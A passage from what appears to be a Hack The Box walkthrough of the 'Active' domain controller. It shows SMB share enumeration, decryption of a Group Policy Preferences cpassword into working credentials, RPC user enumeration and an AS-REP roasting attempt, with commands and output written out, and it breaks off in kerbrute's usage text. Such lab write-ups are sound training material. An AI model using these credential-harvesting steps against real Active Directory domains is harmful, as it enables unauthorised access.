-
-<ul>
-  <li>Active is a quick and fun medium box where we have to do SMB enumeration to obtain credentials of a valid user in the dc and Kerberoasting to receive a ticket to crack this ticket is for the administrator user.</li>
-</ul>
-
-<h2 id="portscan">PortScan</h2>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p53</span>,88,135,139,445,593,3269,47001,49153,49168 10.10.10.100 <span class="nt">-oN</span> targeted
-Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-01-28 17:22 CST
-Nmap scan report <span class="k">for </span>10.10.10.100
-Host is up <span class="o">(</span>0.66s latency<span class="o">)</span><span class="nb">.</span>
-
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span> <span class="o">(</span>Windows Server 2008 R2 SP1<span class="o">)</span>
-| dns-nsid: 
-|_  bind.version: Microsoft DNS 6.1.7601 <span class="o">(</span>1DB15D39<span class="o">)</span>
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-01-28 23:22:21Z<span class="o">)</span>
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-3269/tcp  open  tcpwrapped
-47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-49153/tcp open  msrpc         Microsoft Windows RPC
-49168/tcp open  msrpc         Microsoft Windows RPC
-Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode: 
-|   2.1: 
-|_    Message signing enabled and required
-| smb2-time: 
-|   <span class="nb">date</span>: 2023-01-28T23:23:22
-|_  start_date: 2023-01-28T23:13:30
-|_clock-skew: <span class="nt">-1s</span>
-</code></pre></div></div>
-
-<h2 id="enumeration">Enumeration</h2>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100
-SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-</code></pre></div></div>
-
-<ul>
-  <li>We see a domain add to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 active.htb
-PING active.htb <span class="o">(</span>10.10.10.100<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
-64 bytes from active.htb <span class="o">(</span>10.10.10.100<span class="o">)</span>: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>902 ms
-
-<span class="nt">---</span> active.htb ping statistics <span class="nt">---</span>
-1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
-rtt min/avg/max/mdev <span class="o">=</span> 901.525/901.525/901.525/0.000 ms
-❯ <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
-10.10.10.100 active.htb
-</code></pre></div></div>
-
-<ul>
-  <li>There are shared resources.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.100 <span class="nt">-N</span>
-Anonymous login successful
-
-	Sharename       Type      Comment
-	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
-	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
-	C<span class="nv">$ </span>             Disk      Default share
-	IPC<span class="nv">$ </span>           IPC       Remote IPC
-	NETLOGON        Disk      Logon server share 
-	Replication     Disk      
-	SYSVOL          Disk      Logon server share 
-	Users           Disk      
-SMB1 disabled <span class="nt">--</span> no workgroup available
-</code></pre></div></div>
-
-<ul>
-  <li>We can read <code class="language-plaintext highlighter-rouge">Replication</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100
-<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
-	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
-	IPC<span class="nv">$ </span>                                             	NO ACCESS	Remote IPC
-	NETLOGON                                          	NO ACCESS	Logon server share 
-	Replication                                       	READ ONLY	
-	SYSVOL                                            	NO ACCESS	Logon server share 
-	Users                                             	NO ACCESS	
-
-</code></pre></div></div>
-
-<ul>
-  <li>We found this.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication
-<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	Replication                                       	READ ONLY	
-	.<span class="se">\R</span>eplication<span class="se">\*</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	active.htb
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/
-<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	Replication                                       	READ ONLY	
-	.<span class="se">\R</span>eplicationactive.htb<span class="se">\*</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	DfsrPrivate
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Policies
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	scripts
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/
-<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	Replication                                       	READ ONLY	
-	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\*</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="o">{</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span class="o">}</span>
-
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/
-<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	Replication                                       	READ ONLY	
-	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\*</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
-	fr--r--r--               23 Sat Jul 21 05:38:11 2018	GPT.INI
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Group Policy
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	MACHINE
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	USER
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/
-<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	Replication                                       	READ ONLY	
-	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\*</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Microsoft
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Preferences
-	fr--r--r--             2788 Sat Jul 21 05:38:11 2018	Registry.pol
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/
-<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	Replication                                       	READ ONLY	
-	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\*</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Groups
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-r</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/
-<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	Replication                                       	READ ONLY	
-	.<span class="se">\R</span>eplicationactive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\*</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	<span class="nb">.</span>
-	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
-	fr--r--r--              533 Sat Jul 21 05:38:11 2018	Groups.xml
-</code></pre></div></div>
-
-<ul>
-  <li>Now download <code class="language-plaintext highlighter-rouge">Groups.xml</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">--download</span> Replication/active.htb/Policies/<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>/MACHINE/Preferences/Groups/Groups.xml
-<span class="o">[</span>+] Starting download: Replication<span class="se">\a</span>ctive.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>ACHINE<span class="se">\P</span>references<span class="se">\G</span>roups<span class="se">\G</span>roups.xml <span class="o">(</span>533 bytes<span class="o">)</span>
-<span class="o">[</span>+] File output to: /home/miguelrega7/Hackthebox/Active/nmap/10.10.10.100-Replication_active.htb_Policies_<span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>_MACHINE_Preferences_Groups_Groups.xml
-</code></pre></div></div>
-
-<ul>
-  <li>It’s a password.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /usr/bin/cat groups.xml
-&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"utf-8"</span>?&gt;
-&lt;Groups <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{3125E937-EB16-4b4c-9934-544FC6D24D26}"</span><span class="o">&gt;</span>&lt;User <span class="nv">clsid</span><span class="o">=</span><span class="s2">"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span> <span class="nv">image</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">changed</span><span class="o">=</span><span class="s2">"2018-07-18 20:46:06"</span> <span class="nv">uid</span><span class="o">=</span><span class="s2">"{EF57DA28-5F69-4530-A59E-AAB58578219D}"</span><span class="o">&gt;</span>&lt;Properties <span class="nv">action</span><span class="o">=</span><span class="s2">"U"</span> <span class="nv">newName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">fullName</span><span class="o">=</span><span class="s2">""</span> <span class="nv">description</span><span class="o">=</span><span class="s2">""</span> <span class="nv">cpassword</span><span class="o">=</span><span class="s2">"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</span> <span class="nv">changeLogon</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">noChange</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">neverExpires</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">acctDisabled</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">userName</span><span class="o">=</span><span class="s2">"active.htb</span><span class="se">\S</span><span class="s2">VC_TGS"</span>/&gt;&lt;/User&gt;
-&lt;/Groups&gt;
-</code></pre></div></div>
-
-<p><code class="language-plaintext highlighter-rouge">cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"</code></p>
-
-<ul>
-  <li>We can use <code class="language-plaintext highlighter-rouge">ggp-decrypt</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gpp-decrypt <span class="s1">'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'</span>
-GPPstillStandingStrong2k18
-</code></pre></div></div>
-
-<p><code class="language-plaintext highlighter-rouge">GPPstillStandingStrong2k18</code></p>
-
-<ul>
-  <li>And a user.</li>
-</ul>
-
-<p><code class="language-plaintext highlighter-rouge">userName="active.htb\SVC_TGS"</code></p>
-
-<ul>
-  <li>Credentials are correct.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span>
-SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18
-</code></pre></div></div>
-
-<ul>
-  <li>Now that we have credentials we can view other resources.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">--shares</span>
-SMB         10.10.10.100    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:active.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.10.10.100    445    DC               <span class="o">[</span>+] active.htb<span class="se">\S</span>VC_TGS:GPPstillStandingStrong2k18 
-SMB         10.10.10.100    445    DC               <span class="o">[</span>+] Enumerated shares
-SMB         10.10.10.100    445    DC               Share           Permissions     Remark
-SMB         10.10.10.100    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
-SMB         10.10.10.100    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
-SMB         10.10.10.100    445    DC               C<span class="nv">$ </span>                             Default share
-SMB         10.10.10.100    445    DC               IPC<span class="nv">$ </span>                           Remote IPC
-SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
-SMB         10.10.10.100    445    DC               Replication     READ            
-SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
-SMB         10.10.10.100    445    DC               Users           READ   
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users
-<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	Users                                             	READ ONLY	
-	.<span class="se">\U</span>sers<span class="se">\*</span>
-	dw--w--w--                0 Sat Jul 21 09:39:20 2018	<span class="nb">.</span>
-	dw--w--w--                0 Sat Jul 21 09:39:20 2018	..
-	dr--r--r--                0 Mon Jul 16 05:14:21 2018	Administrator
-	dr--r--r--                0 Mon Jul 16 16:08:56 2018	All Users
-	dw--w--w--                0 Mon Jul 16 16:08:47 2018	Default
-	dr--r--r--                0 Mon Jul 16 16:08:56 2018	Default User
-	fr--r--r--              174 Mon Jul 16 16:01:17 2018	desktop.ini
-	dw--w--w--                0 Mon Jul 16 16:08:47 2018	Public
-	dr--r--r--                0 Sat Jul 21 10:16:32 2018	SVC_TGS
-</code></pre></div></div>
-
-<ul>
-  <li>We can see the <code class="language-plaintext highlighter-rouge">SVC_TGS</code> directory.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users/SVC_TGS
-<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	Users                                             	READ ONLY	
-	.<span class="se">\U</span>sersSVC_TGS<span class="se">\*</span>
-	dr--r--r--                0 Sat Jul 21 10:16:32 2018	<span class="nb">.</span>
-	dr--r--r--                0 Sat Jul 21 10:16:32 2018	..
-	dr--r--r--                0 Sat Jul 21 10:14:20 2018	Contacts
-	dr--r--r--                0 Sat Jul 21 10:14:42 2018	Desktop
-	dr--r--r--                0 Sat Jul 21 10:14:28 2018	Downloads
-	dr--r--r--                0 Sat Jul 21 10:14:50 2018	Favorites
-	dr--r--r--                0 Sat Jul 21 10:15:00 2018	Links
-	dr--r--r--                0 Sat Jul 21 10:15:23 2018	My Documents
-	dr--r--r--                0 Sat Jul 21 10:15:40 2018	My Music
-	dr--r--r--                0 Sat Jul 21 10:15:50 2018	My Pictures
-	dr--r--r--                0 Sat Jul 21 10:16:05 2018	My Videos
-	dr--r--r--                0 Sat Jul 21 10:16:20 2018	Saved Games
-	dr--r--r--                0 Sat Jul 21 10:16:32 2018	Searches
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">-r</span> Users/SVC_TGS/Desktop
-<span class="o">[</span>+] IP: 10.10.10.100:445	Name: active.htb                                        
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	Users                                             	READ ONLY	
-	.<span class="se">\U</span>sersSVC_TGS<span class="se">\D</span>esktop<span class="se">\*</span>
-	dr--r--r--                0 Sat Jul 21 10:14:42 2018	<span class="nb">.</span>
-	dr--r--r--                0 Sat Jul 21 10:14:42 2018	..
-	fw--w--w--               34 Sat Jan 28 17:14:19 2023	user.txt
-</code></pre></div></div>
-
-<h2 id="user-flag">User flag</h2>
-
-<ul>
-  <li>Download the <code class="language-plaintext highlighter-rouge">user.txt</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.100 <span class="nt">-u</span> <span class="s1">'SVC_TGS'</span> <span class="nt">-p</span> <span class="s1">'GPPstillStandingStrong2k18'</span> <span class="nt">--download</span> Users/SVC_TGS/Desktop/user.txt
-<span class="o">[</span>+] Starting download: Users<span class="se">\S</span>VC_TGS<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt <span class="o">(</span>34 bytes<span class="o">)</span>
-<span class="o">[</span>+] File output to: /home/miguelrega7/Hackthebox/Active/content/10.10.10.100-Users_SVC_TGS_Desktop_user.txt
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">mv </span>10.10.10.100-Users_SVC_TGS_Desktop_user.txt user.txt
-❯ /usr/bin/cat user.txt
-b7d2dfba479b6ffa88442b747b15b65d
-</code></pre></div></div>
-
-<h2 id="root">Root</h2>
-
-<ul>
-  <li>We need more information about the DC.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s2">"SVC_TGS%GPPstillStandingStrong2k18"</span> 10.10.10.100
-rpcclient <span class="nv">$&gt;</span> enumdomusers
-user:[Administrator] rid:[0x1f4]
-user:[Guest] rid:[0x1f5]
-user:[krbtgt] rid:[0x1f6]
-user:[SVC_TGS] rid:[0x44f]
-rpcclient <span class="nv">$&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Groups.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> enumdomgroups
-group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
-group:[Domain Admins] rid:[0x200]
-group:[Domain Users] rid:[0x201]
-group:[Domain Guests] rid:[0x202]
-group:[Domain Computers] rid:[0x203]
-group:[Domain Controllers] rid:[0x204]
-group:[Schema Admins] rid:[0x206]
-group:[Enterprise Admins] rid:[0x207]
-group:[Group Policy Creator Owners] rid:[0x208]
-group:[Read-only Domain Controllers] rid:[0x209]
-group:[DnsUpdateProxy] rid:[0x44e]
-rpcclient <span class="nv">$&gt;</span> 
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nv">$&gt;</span> querygroupmem 0x200
-	rid:[0x1f4] attr:[0x7]
-rpcclient <span class="nv">$&gt;</span> queryuser 0x1f4
-	User Name   :	Administrator
-	Full Name   :	
-	Home Drive  :	
-	Dir Drive   :	
-	Profile Path:	
-	Logon Script:	
-	Description :	Built-in account <span class="k">for </span>administering the computer/domain
-	Workstations:	
-	Comment     :	
-	Remote Dial :
-	Logon Time               :	sáb, 28 ene 2023 17:14:29 CST
-	Logoff Time              :	mié, 31 dic 1969 18:00:00 CST
-	Kickoff Time             :	mié, 31 dic 1969 18:00:00 CST
-	Password last <span class="nb">set </span>Time   :	mié, 18 jul 2018 14:06:40 CDT
-	Password can change Time :	jue, 19 jul 2018 14:06:40 CDT
-	Password must change Time:	mié, 13 sep 30828 20:48:05 CST
-	unknown_2[0..31]...
-	user_rid :	0x1f4
-	group_rid:	0x201
-	acb_info :	0x00000210
-	fields_present:	0x00ffffff
-	logon_divs:	168
-	bad_password_count:	0x00000000
-	logon_count:	0x0000003f
-	padding1[0..7]...
-	logon_hrs[0..21]...
-rpcclient <span class="nv">$&gt;</span> 
-
-</code></pre></div></div>
-
-<ul>
-  <li>More information about the users.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s2">"SVC_TGS%GPPstillStandingStrong2k18"</span> 10.10.10.100
-rpcclient <span class="nv">$&gt;</span> querydispinfo
-index: 0xdea RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>administering the computer/domain
-index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Built-in account <span class="k">for </span>guest access to the computer/domain
-index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: <span class="o">(</span>null<span class="o">)</span>	Desc: Key Distribution Center Service Account
-index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS	Name: SVC_TGS	Desc: <span class="o">(</span>null<span class="o">)</span>
-rpcclient <span class="nv">$&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Create a file.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ /bin/cat users.txt
-SVC_TGS
-</code></pre></div></div>
-
-<h2 id="as-rep-roasting">AS-REP Roasting</h2>
-
-<ul>
-  <li>To do this your clock has to be synchronized with the dc clock, if you ever have to do it you can use this command.</li>
-</ul>
-
-<p><code class="language-plaintext highlighter-rouge">ntpdate 10.10.10.100</code></p>
-
-<ul>
-  <li>
-    <p>We could do this if we do not have credentials but since we have the password it was not necessary but if we did not have it we could have requested a ticket but it is not possible.</p>
-  </li>
-  <li>
-    <p>Here you have a link where they explain it very well.</p>
-  </li>
-  <li>
-    <p><a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/">https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/</a></p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ GetNPUsers.py active.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
-Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
-
-<span class="o">[</span>-] User SVC_TGS doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
-</span></code></pre></div></div>
-
-<ul>
-  <li>
-    <p>The port 88 is open so we can use kerbrute as well.</p>
-  </li>
-  <li>
-    <p><a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./kerbrute_linux_amd64
-
-    __             __               __     
-   / /_____  _____/ /_  _______  __/ /____ 
-  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
- / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
-/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/                                        
-
-Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 01/28/23 - Ronnie Flathers @ropnop
-
-This tool is designed to assist <span class="k">in </span>quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
-It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
-Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts
-
-Usage:
-  kerbrute <span class="o">[</span><span class="nb">command</span><span class="o">]</span>
-
-Available Commands:
